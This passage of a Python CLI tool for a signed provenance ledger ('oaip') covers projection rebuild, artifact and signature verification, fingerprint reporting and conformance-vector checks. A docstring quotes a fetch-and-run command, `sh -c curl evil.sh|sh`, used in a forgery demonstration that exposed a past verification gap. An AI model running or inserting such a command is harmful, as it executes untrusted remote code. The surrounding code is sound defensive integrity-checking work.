            elif c[0] != subj_hash:
                refused_why[wid] = (f"it names claim {cid} but carries a "
                                    "different subject than that claim's")
                print(f"WARN  accept {wid[:12]} names claim {cid} but the "
                      "warrant's subject is not that claim's subject; edge "
                      "not derived", file=sys.stderr)
            elif not c[1]:
                refused_why[wid] = (f"it names claim {cid}, whose own validation "
                                    "check FAILED")
                print(f"WARN  accept {wid[:12]} names claim {cid} whose own "
                      "check FAILED; cmd_accept would refuse it, so rebuild "
                      "refuses the edge", file=sys.stderr)
            else:
                edge(cid, wid, wts)
        elif subj_hash not in claim_subjects:
            # Not an OAIP claim acceptance at all. A Warrant store legitimately
            # holds other decisions — root adoption, key rotation, anything the
            # operator files with the same CLI — and emitting a forgery-adjacent
            # warning about them on every rebuild was a false accusation, made
            # repeatedly (F14).
            pass
        elif not allow_legacy:
            print(f"WARN  accept {wid[:12]} is about an OAIP claim's subject but "
                  "carries no oaip-claim:<id> note, so WHICH claim it accepted "
                  "is not recorded — and the subject alone cannot say (two "
                  "claims with opposite verdicts over one execution share it). "
                  "No edge derived. Pass --allow-legacy-links to fall back to "
                  "subject-hash matching for records that predate the note "
                  "convention.", file=sys.stderr)
        elif cutoff is not None and not (isinstance(wts, int) and wts < cutoff):
            print(f"WARN  accept {wid[:12]} carries no oaip-claim:<id> note but "
                  f"was filed at ts={wts}, at or after this store began "
                  f"requiring one (ts={cutoff}, {STOREMETA}). It is not a legacy "
                  "record; --allow-legacy-links does not cover it and no edge is "
                  "derived.", file=sys.stderr)
        else:
            cids = supported_by_subject.get(subj_hash, [])
            print(f"WARN  --allow-legacy-links: accept {wid[:12]} carries no "
                  f"explicit claim link; GUESSING by subject hash -> "
                  f"{len(cids)} supported claim(s). This can attach one signed "
                  "acceptance to a claim its signer never accepted, because the "
                  "claim subject excludes the check command and the verdict. "
                  "Only records filed before "
                  + (f"ts={cutoff}" if cutoff is not None
                     else "this store had a format marker")
                  + " are eligible.", file=sys.stderr)
            for cid in cids:
                edge(cid, wid, wts)
    # Re-register the artifacts themselves, so the index over the canonical layer
    # is complete rather than only covering what the records referenced.
    #
    # THE KIND IS RE-DERIVED, NOT OVERWRITTEN (F15, 2026-07-30, second review
    # round). This loop used to insert every artifact as kind "rebuilt", which
    # DESTROYED "record:intent" / "record:execution" / "record:claim" /
    # "claim-subject" / "stdout" / "check-transcript" on a CLEAN, honest store —
    # a real post-rebuild difference in the graph §5 says must be identical. The
    # test could not see it: `TABLES` omitted `artifacts` (7 tables exist, 6 were
    # compared), the same "the comparison couldn't see the loss" pattern that
    # earlier hid the missing claim→warrant edge.
    #
    # The kinds are recovered from what the records SAY, replayed in the order the
    # live path writes them. Order matters because `put_artifact` is INSERT OR
    # IGNORE and two artifacts can share one address — an empty stdout and an
    # empty check transcript hash alike, which is the common case for a quiet
    # command — so the FIRST writer's kind is the one that stands. `cmd_run` puts
    # stdout, then the execution record; `cmd_claim` puts the transcript, then the
    # subject, then the claim record. `records` is already sorted by (ts, id), so
    # mentioning each record's referents in that same order reproduces the live
    # projection exactly rather than approximately.
    kinds = {}
    for d in records:
        k = rec_type[id(d)]
        if k == "execution" and isinstance(d["output"], str):
            kinds.setdefault(d["output"], "stdout")
        elif k == "claim":
            v = d["validation"]
            kinds.setdefault(v["check"], "check")
            kinds.setdefault(v["transcript"], "check-transcript")
            kinds.setdefault(d["subject"], "claim-subject")
        addr = rec_addr.get(id(d))
        if addr:
            kinds.setdefault(addr, artifact_kind(k))
    for path in sorted(ART.glob("*")):
        # "unreferenced" only for a blob no record explains — which the live path
        # cannot produce, since `put_artifact` always names a kind. Saying
        # "rebuilt" for everything was the defect; saying it for nothing that has
        # a real kind is the fix.
        con.execute("INSERT OR IGNORE INTO artifacts(hash,kind,size) VALUES (?,?,?)",
                    (path.name, kinds.get(path.name, "unreferenced"),
                     path.stat().st_size))
    con.commit()
    con.close()
    # §6.2: records this reader could not read are REPORTED, never dropped in
    # silence and never counted as corruption. Silence here would make a
    # forward-dated record indistinguishable from one that was never written.
    if legacy:
        print(f"NOTE  {len(legacy)} record(s) in this ledger are in the "
              f"PRE-0.1 format (SPEC §6.4). They were read under the legacy "
              "rules and every row derived from them is marked "
              f"format={LEGACY_FORMAT!r} — in particular their state columns "
              "hold git TREE ids, not StateIDs, and they carry no environment "
              "or toolchain fingerprint that any verifier can reproduce. New "
              "records are written in v0.1 shape; nothing here was rewritten, "
              "because a record is addressed by the hash of its own bytes.",
              file=sys.stderr)
    for name, outcome, t, ver, detail in unread:
        print(f"NOTE  artifact {name[:12]}: {outcome} — {detail}. It is left "
              "exactly as it is and contributes nothing to this projection.",
              file=sys.stderr)
    os.replace(tmp_db, DB)          # atomic: never a moment with no projection
    UNTRUSTED.unlink(missing_ok=True)   # this projection WAS derived; it stands
    print("rebuilt projection from the canonical layer: "
          + ", ".join(f"{k}={v}" for k, v in sorted(counts.items())))

    # A DROPPED EDGE IS NOT A SUCCESSFUL REBUILD (C2-F1b, third adversarial
    # round). §5's "the same graph" is the promise; when the rebuild cannot keep
    # it, the exit status must not say otherwise. The new projection stands —
    # it is what the canonical layer actually supports — and the loss is named,
    # edge by edge, with the reason the derivation refused it.
    dropped = sorted(prev_edges - derived)
    if dropped:
        for cid, wid in dropped:
            why = refused_why.get(wid, "the accept record is no longer in the "
                                       "store, or no longer names this claim")
            print(f"ERR   this rebuild LOST an acceptance edge the previous "
                  f"projection asserted: claim {cid} -> warrant {wid[:12]} — "
                  f"{why}", file=sys.stderr)
        sys.exit(f"rebuilt, but {len(dropped)} acceptance edge(s) the previous "
                 "projection asserted are NOT derivable from this canonical "
                 "layer. The new projection is in place and no longer asserts "
                 "them; that is a change to the graph, not a successful "
                 "reconstruction.")


def verify_artifacts():
    """Every artifact's bytes must hash to its filename, and every record must be
    canonical I-JSON. Returns (errors, claim subject hashes).

    Also: every hash the projection CITES must resolve. A dangling citation means
    the projection asserts a fact whose evidence is absent — reporting the graph
    as intact then is the same mistake as trusting a filename.

    The claim subjects come back with the errors because `cmd_verify` needs the
    same fact `_rebuild` needs — is this accept about an OAIP claim at all? — and
    reading the artifact directory twice to answer it would be a second
    observation of a mutable directory (F6).
    """
    errs, subjects = [], set()
    if not ART.is_dir():
        return [f"no canonical layer at {ART}"], subjects
    present = set()
    for path in sorted(ART.glob("*")):
        doc, err = read_artifact(path)
        if err:
            errs.append(err)
            continue
        present.add(path.name)
        # THE SHAPE, not only the address and the canonicalization. A record can
        # sit at the address of its own impeccable JCS bytes and still assert
        # something no conforming reader can interpret — an unregistered effect
        # kind, a `killed` process with an exit code, an attribution claiming
        # certainty a method may not claim. Checking the address without checking
        # the shape is the same defect this file already found once at the layer
        # below: verifying something adjacent to the evidence.
        outcome, t, ver, detail = validate_record(doc)
        if outcome == "invalid":
            errs.append(f"{path.name[:12]}: {t or 'record'} is not valid under "
                        f"SPEC §2: {detail}")
        elif outcome in ("unsupported-version", "unknown-type", "legacy"):
            # §6.2: neither valid nor corrupt. Reported as itself, and NOT an
            # error — calling a forward-dated record corrupt is how a
            # forward-compatible writer becomes indistinguishable from an
            # attacker.
            print(f"NOTE  {path.name[:12]}: {outcome} — {detail}")
        elif t == "claim":
            subjects.add(doc["subject"])

    if DB.is_file():
        con = db()
        con.row_factory = sqlite3.Row
        cited = []
        for row in con.execute("SELECT hash FROM artifacts"):
            cited.append(("artifacts.hash", row[0]))
        for row in con.execute("SELECT id,subject_hash,transcript_hash,check_hash"
                               " FROM claims"):
            cited.append((f"claim {row[0]}.subject", row[1]))
            cited.append((f"claim {row[0]}.transcript", row[2]))
            cited.append((f"claim {row[0]}.check", row[3]))
        for where, h in cited:
            if h and h not in present:
                errs.append(f"{where} cites {h[:12]} — not resolvable in the "
                            "canonical layer")
    return errs, subjects


def fingerprint_report():
    """SPEC §2.2.4: matched / mismatched / unreproducible, for every State.

    THE GAP THIS CLOSES. §2.2.4 says a conforming verifier MUST distinguish
    three fingerprint outcomes and MUST NOT collapse `unreproducible` into
    `matched`. `oaip verify` reported no outcome at all, which is the collapse
    with the middle step left out: a reader saw "canonical layer: every artifact
    matches its address" and had nothing telling them the environment behind
    those records was never checked. A specification clause no implementation
    demonstrates is a clause nobody has tested.

    The outcomes are REPORTED and never fatal, exactly as §2.2.4 requires:
    environments change with time, so a mismatch is not evidence of tampering,
    and whether either outcome blocks anything is a policy question one layer
    above OAIP (§0). A malformed fingerprint is a different matter entirely — it
    makes the State record invalid, and `verify_artifacts` already refuses it.
    """
    if not DB.is_file():
        return []
    try:
        con = db()
        states = list(con.execute(
            "SELECT id, env_fingerprint, toolchain_fingerprint FROM states"))
        legacy_n = con.execute(
            "SELECT COUNT(*) FROM executions WHERE format IS NOT ?",
            ("0.1",)).fetchone()[0]
        con.close()
    except sqlite3.Error as e:
        return [f"fingerprints:    unreproducible — the projection could not be "
                f"read ({e})"]
    if not states and not legacy_n:
        return ["fingerprints:    (no States recorded)"]
    try:
        _envr, env_now = environment_probe()
        _toolr, tool_now = toolchain_probe()
    except SystemExit as e:
        # This host cannot run the profile's probes. That is `unreproducible`
        # for every State, and it is NOT `mismatched`: nothing was compared.
        return [f"fingerprints:    {len(states)} State(s) UNREPRODUCIBLE on this "
                f"host — the posix-base@v1 probes could not be run ({e}). "
                "Nothing was compared; this is not a mismatch."]
    matched = sum(1 for _sid, e, t in states
                  if e == env_now and t == tool_now)
    mismatched = len(states) - matched
    out = [f"fingerprints:    {matched} matched, {mismatched} mismatched, "
           f"{legacy_n} unreproducible (§2.2.4, posix-base@v1)"]
    if mismatched:
        out.append("                 a mismatch is not evidence of tampering: a "
                   "State says what was observed then, not a promise about now. "
                   "Whether it blocks anything is a policy question above OAIP.")
    if legacy_n:
        out.append(f"                 {legacy_n} pre-0.1 execution(s) carry no "
                   "State and no toolchain fingerprint at all, so no outcome "
                   "other than `unreproducible` is available for them (§6.4).")
    return out


def cmd_verify(_):
    """Verify the canonical layer FIRST, then the decision layer.

    WHAT THIS USED TO DO, AND WHY IT WAS WRONG
    ------------------------------------------
    It shelled out to `warrant verify` on `.oaip/warrants` and printed the last
    line — nothing else. Not one byte of `.oaip/artifacts` was examined, though
    SPEC §5 calls that layer the truth. Demonstrated 2026-07-30: with all three
    canonical records forged (`command` rewritten to `sh -c curl evil.sh|sh`),
    `oaip verify` printed "0 errors" and exited 0. It was checking the store next
    door to the evidence — a real, adjacent, healthy thing — and reporting that
    as the health of this one.

    AND WHY IT WAS STILL WRONG AFTER THAT
    -------------------------------------
    It reported `warrant verify`'s last line, and `warrant verify` exits 0 for an
    acceptance signed by a key nobody vouches for — Warrant reports an unverified
    key↔actor binding as a WARN by SPECIFICATION (§5). So `oaip verify` printed
    "0 errors" for a store in which an attacker-generated key had accepted a claim
    as `tester@local` (2026-07-30, second review round). An acceptance whose signer
    is unknown is now an OAIP-level ERROR — for the accepts that claim to be
    OAIP's; a Warrant store may legitimately hold OTHER decisions (root adoption,
    key rotation) that this ledger has no business vouching for.

    AND IT AUDITS THE SAME ACCEPTS `rebuild` DOES (F6, 2026-07-30, fourth round)
    ---------------------------------------------------------------------------
    `_rebuild` runs `assess_signer` on EVERY accept in the store; this function
    ran it only on accepts whose note starts with `oaip-claim:`. The two agreed
    on EDGES — nothing was ever derived unverified — and disagreed on REPORTING,
    which is the half a human acts on: a note-less accept whose signature is
    broken made `rebuild` print a WARN and `verify` print nothing at all. Under
    `--allow-legacy-links` such an accept can even produce an edge, so `verify`
    was silent about exactly the records the weaker path derives from. The set is
    now the same; only the SEVERITY differs, on the same criterion `_rebuild`
    uses to decide whether a record is this ledger's business at all (F14): an
    accept that names an OAIP claim, or carries a claim's subject hash, is an
    ERROR when its signer cannot be established, and any other decision in the
    store is reported as the WARN `rebuild` prints and left to its own ledger.
    """
    errs, claim_subjects = verify_artifacts()
    for e in errs:
        print("ERR ", e)
    print(f"canonical layer: {len(errs)} error(s)" if errs
          else "canonical layer: every artifact matches its address")

    # CUSTODY IS A LAYER OF ITS OWN, and it is the one this tool never reported.
    # Every other line here is about bytes that are already written; this one is
    # about who can write the next ones (O4).
    custody = trust_perm_errors()
    for e in custody:
        print("ERR ", e)
    where = ("IN THE OBSERVED WORKSPACE — whatever this ledger observes can "
             "rewrite the keyring and read the key"
             if trust_root_mode() == "workspace"
             else "outside the observed workspace")
    print(f"key custody:     {len(custody)} error(s); trust root {TRUST_ROOT}"
          if custody else
          f"key custody:     trust root {TRUST_ROOT.resolve()}, {where}")

    # The projection is a THIRD thing, named as itself: a fault here is neither
    # the canonical layer's nor the decision layer's, and this file has already
    # been wrong once by reporting one layer's health as another's.
    proj_errs = []
    why = untrusted_reason()
    if why is not None:
        # The projection outlived a refusal, so it may still assert facts this
        # canonical layer does not support. Reporting it as healthy is how a
        # forged edge stayed readable as "(signed decision)" forever (C2-F1a).
        proj_errs.append(f"projection {DB}: MARKED UNTRUSTED — a rebuild refused "
                         "this canonical layer, and the projection predates that "
                         f"refusal ({why}). Rebuild before believing it.")
    for e in proj_errs:
        print("ERR ", e)
    print(f"projection:      {len(proj_errs)} error(s)" if proj_errs
          else "projection:      derived (no refused rebuild since)")

    for line in fingerprint_report():
        print(line)

    accepts, wrec_files, store_errs = read_warrant_store()
    report, rerr = store_report() if wrec_files else (None, None)
    for e in store_errs:
        print("ERR ", e)
    if rerr:
        print("ERR  decision layer: " + rerr)
    dec_errs = list(store_errs) + ([rerr] if rerr else [])
    if report:
        actors, aerr = read_trust()
        if aerr:
            print("ERR ", aerr)
            dec_errs.append(aerr)
        else:
            assess_signer = signer_gate(report, actors, unbound_by_warrant())
            # EVERY accept, exactly as `_rebuild` does (F6). The note only
            # decides how loudly a failure is reported, never whether it is
            # looked at — a record `verify` never examines is a record whose
            # signature nobody re-checks between rebuilds.
            for acc in accepts:
                why, notes = assess_signer(acc["wid"], acc["env"])
                for n in notes:
                    # A co-signature is a fact about the record worth printing,
                    # and not an error: §5 permits appending one (C2-F1b).
                    print(f"NOTE  accept {acc['wid'][:12]}: {n}")
                if why is None:
                    continue
                if (acc["note"].lower().startswith(NOTE_PREFIX)
                        or acc["subject"] in claim_subjects):
                    # This ledger's own business: it names an OAIP claim, or it
                    # carries a claim's subject hash (the record
                    # `--allow-legacy-links` would derive an edge from).
                    msg = (f"accept {acc['wid'][:12]} is about an OAIP claim but "
                           "no key bound to the actor it names signed it: "
                           f"{why}")
                    print("ERR ", msg)
                    dec_errs.append(msg)
                else:
                    # Some other ledger's decision, sharing this store (F14).
                    # `rebuild` warns and derives nothing; saying more than that
                    # here would be an accusation this ledger cannot support.
                    print(f"WARN  accept {acc['wid'][:12]}: {why} — not an OAIP "
                          "claim acceptance, so this ledger derives nothing from "
                          "it either way")
        print(f"decision layer:  {report['records']} records, "
              f"{report['errors'] + len(dec_errs)} error(s), "
              f"{report['warnings']} warning(s)"
              + ("" if report["errors"] == 0 else "  [Warrant]"))
    elif not wrec_files:
        print("decision layer:  (empty store)")
    sys.exit(1 if (errs or dec_errs or proj_errs or custody
                   or (report and report["errors"])) else 0)


# ---------------------------------------------------------------------------
# WHERE THE VECTOR CORPUS LIVES
#
# `conformance` and `records` are the two verbs that let a stranger ask whether
# THIS build agrees with SPEC §1 and §10. Up to and including 0.2.0 both
# defaulted to the literal relative path `examples/vectors.json`, which resolves
# only when the process happens to be standing in a checkout. `pip install
# oaip==0.2.0 && cd /tmp && oaip records` therefore produced a
# FileNotFoundError traceback: a documented verb, on a fresh install, from every
# directory but one. That shipped to PyPI.
#
# The corpus is now IN the distribution — `oaip_vectors` is `examples/` under a
# package name (same files, one source of truth; see pyproject.toml), so the
# self-check computes from site-packages, from a checkout, and from an unpacked
# sdist alike. A protocol package that cannot check its own conformance where it
# is installed is not much of a protocol package.
#
# The checkout is deliberately AUTHORITATIVE where one exists: if this module
# has a sibling `examples/` directory, that directory IS the corpus, and a file
# missing from it is a hard error rather than a quiet fall-through to whatever
# happens to be installed. A checkout that self-verifies against vectors it does
# not contain would be the same class of lie as the bug above.
# ---------------------------------------------------------------------------
VECTORS_PKG = "oaip_vectors"
CHECKOUT_VECTORS = Path(__file__).resolve().parent.parent / "examples"


def vector_source(name):
    """The corpus file `name`, as something with `.read_text()`.

    Checkout/sdist first and exclusively; installed package data otherwise.
    Exits with a sentence rather than a traceback when neither answers."""
    if CHECKOUT_VECTORS.is_dir():
        p = CHECKOUT_VECTORS / name
        if not p.is_file():
            raise SystemExit(
                f"missing vector corpus: {p}\n"
                f"This checkout has an examples/ directory, so it — not any "
                f"installed copy — is what `oaip` must be measured against. "
                f"Restore the file or pass an explicit path.")
        return p
    # Installed: the corpus ships beside the module. This plain path check is
    # first because `oaip_vectors` is a namespace package (examples/ has no
    # __init__.py, and putting one there would be a Python file in a directory
    # of shell demos), and `importlib.resources.files()` only learned to answer
    # for namespace packages in 3.12 — while this package supports 3.9.
    sibling = Path(__file__).resolve().parent / VECTORS_PKG / name
    if sibling.is_file():
        return sibling
    # A loader that is not a directory at all (zipapp, a bundler). Last resort,
    # and best-effort: any failure here is reported as "not found", not raised.
    try:
        from importlib.resources import files
        res = files(VECTORS_PKG) / name
        if res.is_file():
            return res
        detail = f"{VECTORS_PKG} resolves but does not contain {name}"
    except Exception as e:                                    # noqa: BLE001
        detail = f"{sibling} absent, and {VECTORS_PKG} did not resolve ({e})"
    raise SystemExit(
        f"cannot locate the {name} vector corpus.\n"
        f"  no checkout at: {CHECKOUT_VECTORS}\n"
        f"  package data:   {detail}\n"
        f"This build cannot check its own conformance. Reinstall oaip, or pass "
        f"the path to a corpus explicitly.")


def read_vectors(arg, name):
    """Parse the corpus the caller asked for, or the one this build ships."""
    if arg is None:
        return json.loads(vector_source(name).read_text(encoding="utf-8"))
    p = Path(arg)
    if not p.is_file():
        # Loud, and about the path the caller actually named: an explicit
        # argument is never silently replaced by the shipped corpus.
        raise SystemExit(f"no such vector file: {p}")
    return json.loads(p.read_text(encoding="utf-8"))


def cmd_conformance(a):
    """SPEC §1: every OAIP record MUST canonicalize (JCS, Warrant §4) to the pinned
    bytes and identity. Recompute canon over each vector and compare byte-exact."""
    doc = read_vectors(a.vectors, "vectors.json")
    ok = 0
    total = 0
    for v in doc["records"]:
        total += 1
        got = canon(v["record"])
        good = got.hex() == v["canon_hex"] and sha256(got) == v["canon_sha256"]
        print(("OK  " if good else "FAIL"), v["name"], "" if good else f"got {sha256(got)[:12]}")
        ok += good

    # The negative half. An implementation that accepts everything passes every
    # positive vector, so agreement on well-formed records establishes nothing
    # about whether two implementations share a domain (SPEC §1).
    for v in doc.get("reject", []):
        total += 1
        raw = bytes.fromhex(v["bytes_hex"])
        try:
            loads_ijson(raw)
            rejected, why = False, "ACCEPTED — must be refused"
        except (ValueError, UnicodeDecodeError) as e:
            rejected, why = True, str(e)
        print(("OK  " if rejected else "FAIL"), f"reject/{v['class']}/{v['name']}",
              "" if rejected else why)
        ok += rejected

    tag = "ALL PASS" if ok == total else "FAILURES"
    print(f"\nOAIP-CONFORMANCE: {tag} ({ok}/{total})")
    sys.exit(0 if ok == total else 1)


def cmd_records(a):
    """SPEC §10: the RECORD-SHAPE vectors, positive and negative.

    `conformance` pins the serializer; this pins what a record IS. The two are
    not the same check and this repository shipped only the first one for its
    whole life — which is how the reference implementation came to write a
    different record from the one SPEC §2 declares for every single type while
    reporting ALL PASS.

    Every reject vector names the OUTCOME it must produce, not merely "not
    valid": `unsupported-version` and `unknown-type` are distinct from
    `invalid`, and an implementation that returns one for the other has a real
    interoperability bug (§6.2) that a boolean assertion would hide."""
    doc = read_vectors(a.vectors, "record-vectors.json")
    ok = total = 0
    for v in doc["accept"]:
        total += 1
        outcome, t, ver, detail = validate_record(v["record"])
        good = (outcome == "valid" and t == v["type"] and ver == v["version"])
        print(("OK   " if good else "FAIL "), f"accept/{v['type']}/{v['name']}",
              "" if good else f"-> {outcome} {t}/{ver} {detail or ''}")
        ok += good
    for v in doc["reject"]:
        total += 1
        want = v["outcome"]
        if "bytes_hex" in v:
            # These leave the §1 domain, so they are refused at INGESTION and the
            # shape layer never sees them. A vector whose refusal comes from the
            # wrong layer is still a pass here, and saying which layer refused it
            # is the point of printing the detail.
            try:
                rec = loads_ijson(bytes.fromhex(v["bytes_hex"]))
                outcome, detail = validate_record(rec)[0], "shape layer"
            except (ValueError, UnicodeDecodeError) as e:
                outcome, detail = "invalid", f"ingestion: {e}"
        else:
            outcome, _t, _ver, detail = validate_record(v["record"])
        good = outcome == want
        print(("OK   " if good else "FAIL "),
              f"reject/{v['class']}/{v['name']}",
              "" if good else f"-> {outcome}, wanted {want} ({detail or ''})")
        ok += good
    tag = "ALL PASS" if ok == total else "FAILURES"
    print(f"\nOAIP-RECORDS: {tag} ({ok}/{total})")
    sys.exit(0 if ok == total else 1)


def main():
    ap = argparse.ArgumentParser(prog="oaip", description=__doc__.splitlines()[0])
    # GLOBAL, and before the subcommand, because it decides WHERE this ledger's
    # key and keyring are for every verb: `oaip --trust-root ~/keys/proj init`.
    ap.add_argument("--trust-root", metavar="PATH",
                    help="directory holding the signing key and the keyring "
                         "(default: $XDG_CONFIG_HOME/oaip/roots/<this ledger>, "
                         f"outside the observed workspace; ${TRUST_ROOT_ENV} "
                         "sets it for a whole environment)")
    sub = ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("init").set_defaults(fn=cmd_init)
    pi = sub.add_parser("intent"); pi.add_argument("description")
    pi.add_argument("--parent")
    # --actor is OPTIONAL here and required on `do`. SPEC §8: every actor string
    # in an OAIP record is unauthenticated, so demanding one would move the
    # fiction rather than remove it; `do` files a signed warrant, where the name
    # lands inside somebody's decision, and there it is asked for.
    pi.add_argument("--actor", help="who declared this intent (§2.3; "
                    "UNAUTHENTICATED per §8). Default: this OS user@host")
    pi.add_argument("--constraint", action="append",
                    help="a constraint on the intent (§2.3); repeatable")
    pi.add_argument("--acceptance-ref", action="append",
                    help="hex64 artifact that would EVIDENCE satisfaction "
                         "(§2.3); repeatable")
    pi.set_defaults(fn=cmd_intent)
    pr = sub.add_parser("run"); pr.add_argument("--intent")
    pr.add_argument("--actor", help="the executor (§2.4 executor.actor; "
                    "UNAUTHENTICATED per §8). Default: this OS user@host")
    pr.add_argument("command", nargs=argparse.REMAINDER); pr.set_defaults(fn=cmd_run)
    pc = sub.add_parser("claim"); pc.add_argument("--execution", required=True); pc.add_argument("--predicate", required=True); pc.add_argument("--check", required=True)
    pc.add_argument("--actor", help="who proposes the claim (§2.7 proposed_by; "
                    "UNAUTHENTICATED per §8). Default: this OS user@host")
    pc.add_argument("--allow-check-effects", action="store_true",
                    help="file the claim even though the validation check MUTATED the observed workspace, CITING what it changed as evidence (§2.7). Without it such a claim is refused: the Execution's output state was snapshotted before the check ran, so the decision would omit those changes. It observes; it does not confine")
    pc.set_defaults(fn=cmd_claim)
    pa = sub.add_parser("accept"); pa.add_argument("--claim", required=True); pa.add_argument("--actor", required=True); pa.set_defaults(fn=cmd_accept)
    pb = sub.add_parser("bind", help="vouch that a key may sign as an actor "
                        "(rebuild derives no acceptance edge from an unbound signer)")
    pb.add_argument("--actor", required=True)
    pb.add_argument("--key", help="hex64 Ed25519 public key; defaults to this "
                    "ledger's own key")
    pb.add_argument("--foreign-key", action="store_true",
                    help="required to bind a key that is NOT this ledger's own "
                         "(.oaip/dev.key.pub): OAIP cannot custody or revoke it, "
                         "and every acceptance it signs becomes an edge")
    pb.set_defaults(fn=cmd_bind)
    pd = sub.add_parser("do", help="one-shot: intent -> run -> validate -> accept-if-pass")
    pd.add_argument("--intent", required=True); pd.add_argument("--check", required=True)
    pd.add_argument("--predicate"); pd.add_argument("--actor", required=True)
    pd.add_argument("--allow-check-effects", action="store_true",
                    help="file the claim even though the validation check MUTATED the observed workspace, CITING what it changed as evidence (§2.7). Without it such a claim is refused: the Execution's output state was snapshotted before the check ran, so the decision would omit those changes. It observes; it does not confine")
    pd.add_argument("command", nargs=argparse.REMAINDER); pd.set_defaults(fn=cmd_do)
    sub.add_parser("log").set_defaults(fn=cmd_log)
    prb = sub.add_parser("rebuild",
                         help="reconstruct the projection from artifacts (SPEC s5)")
    prb.add_argument("--allow-legacy-links", action="store_true",
                     help="for accepts filed BEFORE this store began requiring an "
                          "oaip-claim:<id> note, guess which claim was accepted "
                          "from the subject hash. Unsafe by construction: the "
                          "subject excludes the check command and the verdict, so "
                          "one signed acceptance can be attached to a claim its "
                          "signer never accepted")
    prb.set_defaults(fn=cmd_rebuild)
    sub.add_parser("verify").set_defaults(fn=cmd_verify)
    pt = sub.add_parser("trust-root",
                        help="where this ledger's signing key and keyring live, "
                             "and what that arrangement stops")
    pt.add_argument("--path", action="store_true",
                    help="print only the resolved path")
    pt.add_argument("--migrate", action="store_true",
                    help="move an in-workspace key and keyring out of the "
                         "observed workspace (existing acceptance edges survive)")
    pt.add_argument("--to", metavar="PATH",
                    help="migrate to PATH instead of the default location")
    pt.set_defaults(fn=cmd_trust_root)
    # `vectors` defaults to None, NOT to `examples/…`: a relative path as a
    # default is a promise that only holds in one directory on earth, and 0.2.0
    # shipped it. `vector_source()` decides — checkout first, shipped corpus
    # otherwise — so these two verbs run wherever the package is installed.
    pf = sub.add_parser("conformance", help="canonicalization vectors (SPEC §1) "
                        "— replays the corpus this build ships")
    pf.add_argument("vectors", nargs="?", default=None,
                    help="a vector file to replay instead of the one this "
                         "build ships (default: examples/vectors.json in a "
                         "checkout, else the installed corpus)")
    pf.set_defaults(fn=cmd_conformance)
    pv = sub.add_parser("records", help="record-SHAPE conformance vectors "
                        "(SPEC §10) — what a record is, not how it serializes")
    pv.add_argument("vectors", nargs="?", default=None,
                    help="a vector file to replay instead of the one this "
                         "build ships (default: examples/record-vectors.json "
                         "in a checkout, else the installed corpus)")
    pv.set_defaults(fn=cmd_records)
    a = ap.parse_args()
    # BEFORE any subcommand: every path that signs, vouches, or believes a
    # signature reads these globals, and resolution can REFUSE (an unreadable or
    # contradicted trust root is not a thing to proceed past).
    init_trust_root(a.trust_root)
    if a.cmd in ("run", "do") and a.command and a.command[0] == "--":
        a.command = a.command[1:]
    a.fn(a)


if __name__ == "__main__":
    main()
